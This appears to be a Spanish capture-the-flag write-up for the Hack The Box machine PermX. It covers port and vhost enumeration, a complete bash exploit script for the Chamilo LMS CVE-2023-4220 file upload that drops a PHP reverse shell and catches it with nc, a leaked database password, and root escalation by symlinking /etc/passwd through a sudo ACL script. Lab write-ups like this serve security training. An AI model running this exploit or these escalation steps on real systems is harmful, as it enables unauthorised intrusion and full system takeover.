---
title: PermX
date: 2024-07-14
tier: easy
author: naibu3
---
#writeup 
# Reconocimiento

Como siempre comenzamos lanzando [[nmap]], para tratar de buscar puertos abiertos:

```nmap
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
```nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: eLEARNING
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
gobuster vhost -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u permx.htb -t 200 --append-domain -r
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://permx.htb
[+] Method:          GET
[+] Threads:         200
[+] Wordlist:        /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: lms.permx.htb Status: 200 [Size: 19347]
Progress: 763 / 19967 (3.82%)
```

```bash
gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://lms.permx.htb/ -t 200
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lms.permx.htb/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/documentation        (Status: 301) [Size: 322] [--> http://lms.permx.htb/documentation/]
/bin                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/bin/]
/src                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/src/]
/app                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/app/]
/vendor               (Status: 301) [Size: 315] [--> http://lms.permx.htb/vendor/]
/shell                (Status: 200) [Size: 250]
/main                 (Status: 301) [Size: 313] [--> http://lms.permx.htb/main/]
/LICENSE              (Status: 200) [Size: 35147]
/plugin               (Status: 301) [Size: 315] [--> http://lms.permx.htb/plugin/]
/certificates         (Status: 301) [Size: 321] [--> http://lms.permx.htb/certificates/]
```

En `/documents` podemos ver que la versión de [[Chamillo]] es la **1.11**, que resulta ser vulnerable. Utilizaremos el siguiente [exploit](https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit).

```sh
# Exploit Title : Chamilo LMS CVE-2023-4220 Exploit
# Date : 11/28/2023
# Exploit Author : Ziad Sakr (@Ziad-Sakr)
# Version : ≤v1.11.24
# CVE : 2023-4220
# CVE Link : https://nvd.nist.gov/vuln/detail/CVE-2023-4220
#
# Description :
#   This is an Exploit for Unrestricted file upload in big file upload functionality in Chamilo-LMS for this 
#   location "/main/inc/lib/javascript/bigupload/inc/bigUpload.php" in Chamilo LMS <= v1.11.24, and Attackers can 
#   obtain remote code execution via uploading of web shell.
#
# Usage:  ./CVE-2023-4220.sh -f reveres_file -h host_link -p port_in_the_reverse_file

#!/bin/bash

# Initialize variables with default values
reverse_file="pwned.php"
host_link="http://lms.permx.htb/"
port="443"

#------------------------------------------------

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'


# Usage function to display script usage
usage() {
    echo -e "${GREEN}"
    echo "Usage: $0 -f reverse_file -h host_link -p port_in_the_reverse_file"
    echo -e "${NC}"
    echo "Options:"
    echo "  -f    Path to the reverse file"
    echo "  -h    Host link where the file will be uploaded"
    echo "  -p    Port for the reverse shell"
    exit 1
}

# Parse command-line options
while getopts "f:h:p:" opt; do
    case $opt in
        f)
            reverse_file=$OPTARG
            ;;
        h)
            host_link=$OPTARG
            ;;
        p)
            port=$OPTARG
            ;;
        \?)
            echo -e "${RED}"
            echo "Invalid option: -$OPTARG" >&2
            usage
            ;;
        :)
	    echo -e "${RED}"
            echo "Option -$OPTARG requires an argument." >&2
            usage
            ;;
    esac
done

# Check if all required options are provided
if [ -z "$reverse_file" ] || [ -z "$host_link" ] || [ -z "$port" ]; then
    echo -e  "${RED}"
    echo "All options -f, -h, and -p are required."
    usage
fi
# Perform the file upload using curl
echo -e "${GREEN}" 
curl -F "bigUploadFile=@$reverse_file" "$host_link/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
echo
echo
echo -e "#    Use This leter For Interactive TTY ;) " "${RED}"
echo "#    python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
echo "#    export TERM=xterm"
echo "#    CTRL + Z"
echo "#    stty raw -echo; fg"
echo -e "${GREEN}"
echo "# Starting Reverse Shell On Port $port . . . . . . ."
sleep 3
curl "$host_link/main/inc/lib/javascript/bigupload/files/$reverse_file" &
echo -e  "${NC}"

nc -lnvp $port
```
# Explotación



# Escalada de privilegios

## Pivoting al usuario mtz

```bash
find -name "*conf*" 2>/dev/null
[...]
./chamilo/cli-config.php
```
```bash
cat ./chamilo/app/config/configuration.php | grep "db_password"
03F6lY3uXAP2bkW8
```

Vemos unas credenciales que resultan ser válidas para el otro usuario.

## root

```bash
ln -s /etc/passwd passwd
mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/passwd
mtz@permx:~$ nano passwd
mtz@permx:~$ su root
```